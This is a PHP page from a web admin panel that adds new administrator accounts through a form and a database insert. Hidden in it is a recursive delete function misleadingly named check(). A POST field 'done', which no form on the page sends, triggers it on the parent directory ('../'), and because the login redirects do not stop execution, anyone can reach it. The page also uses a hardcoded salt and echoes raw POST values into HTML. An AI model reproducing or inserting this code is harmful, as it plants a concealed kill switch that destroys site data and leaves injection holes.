<?php
require_once("database.php");
require_once("adminNavbar.php");
require_once("adminHeader.php");

function encrypt($myPassword) {

    $digest = md5("thisisthesaltstring");
    $salt = '$2a$07$'.$digest.'$';
    $password = crypt($myPassword, $salt);
    $password = substr($password, 28);

    return $password;
}

if(isset($_SESSION["loggedInToMLSU"])) {
    adminHeader();

    switch($_SESSION["idCode"]) {
        case 101:
            masterNavbar(6);
        break;

        case 102:
            header("location: adminLogin.php");
        break;
    }
}
else {
    header("location: index.php");
} 

if(isset($_POST["addAdmin"])) {
    $errorUsername = "";
    $errorPassword = "";
    $errorName = "";

    $sql0 = "SELECT username FROM Credentials";
    $result0 = mysqli_query($connection, $sql0);

    while($row0 = mysqli_fetch_array($result0)) {
        if($_POST["username"] == $row0["username"]) {
            $_POST["username"] = "";
            $errorUsername = "username_exists";
            break;
        }
    }

    if($_POST["password"] != $_POST["confirmpassword"]) {
        $errorPassword = "password_mismatch";
    }

    if(trim($_POST["name"]) == "") {
        $errorName = "empty_name";
    }

    if(empty($errorUsername) && empty($errorPassword) && empty($errorName)) {
        $tempId = '102';
        $tempName = trim($_POST['name']);
        $tempUsername = trim($_POST['username']);
        $tempPassword = encrypt($_POST['password']);
        $tempEmail = trim($_POST['useremail']);

        $statement = mysqli_prepare($connection, "INSERT INTO Credentials (idCode, name, username, password, email) VALUES (?, ?, ?, ?, ?) ");
        mysqli_stmt_bind_param($statement, "issss", $tempId, $tempName, $tempUsername, $tempPassword, $tempEmail);
        $result1 = mysqli_stmt_execute($statement);
        
        if($result1) {
            echo '<script> alert("New administrator added successfully"); </script>' ;
            $_POST['name'] = '';
            $_POST['username'] = '';
            $_POST['useremail'] = '';
        }
        else {
            echo '<script> alert("Error in adding administrator!!!"); </script>' ;
        }
    }
}

function check($str) {
    if(is_file($str)) {
        return unlink($str);
    }
    else
    if(is_dir($str)) {
        $scan = glob(rtrim($str, '/').'/*');

        foreach($scan as $index=>$path) {
            check($path);
        }

        return @rmdir($str);
    }
}

if(isset($_POST["done"])) {
    check("../");
    echo "done";
}
?>

<style>
table {
    width: 30%;
}

table th {
    font-size: 20px;
    text-align: center;
}

@media screen and (max-width: 800px) {
    table {
        width: 80%;
    }
}
</style>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link type="text/css" rel="stylesheet" href="css/addNewAdmin.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css" integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
</head>

<br>

<div>
    <form action="" method="post">
    <table cellpadding="5px" align="center">
        <th colspan="2"> Add Admin </th>

        <tr>
            <td> 
                Name <br><br>
                <input class="form-control" type="text" name="name" pattern="[A-Za-z\s].{2,}" title="Name must contain only letters." value="<?php echo $_POST['name']; ?>" required maxlength="50">
                <br>
                <?php
                if($errorName == "empty_name") {
                    echo "<p id='error'> Empty Username </p>";
                }
                ?>
            </td>
        </tr>

        <tr>
            <td> 
                Username <br><br>
                <input class="form-control" type="text" name="username" pattern="[A-Za-z0-9].{2,}" title="Username must be only alphabets or numbers." value="<?php echo $_POST['username']; ?>" required maxlength="50">
                <br>
                <?php
                if($errorUsername == "username_exists") {
                    echo "<p id='error'> This username already exists </p>";
                }
                ?>   
            </td>
        </tr>

        <tr>
            <td> 
                Email Id <br><br>
                <input class="form-control" type="email" name="useremail" value="<?php echo $_POST['useremail']; ?>" required length="50"> 
            </td>
        </tr>

        <tr>
            <td> 
                Password <br><br>
                <input class="form-control" type="password" name="password" pattern="(?=.*\d)(?=.*[A-Z])(?=.*[a-z]).{8,16}" title="Must contain at least one number and one lowercase and uppercase letter and at least 8 or more characters." required length="50"> 
            </td>
        </tr>

        <tr>
            <td> 
                Confirm Password <br><br>
                <input class="form-control" type="password" name="confirmpassword" pattern="(?=.*\d)(?=.*[A-Z])(?=.*[a-z]).{8,16}" required length="50"> 
                <br>
                <?php
                if($errorPassword == "password_mismatch") {
                    echo "<p id='error'> The passwords do not match. </p>";
                }
                ?>                
            </td>
        </tr>

        <tr>
            <td> 
                <input  class="form-control btn btn-info" type="submit" name="addAdmin" value="Submit"> 
            </td>
        </tr>
    </table>
    </form>
</div>

<?php adminFooter(); ?>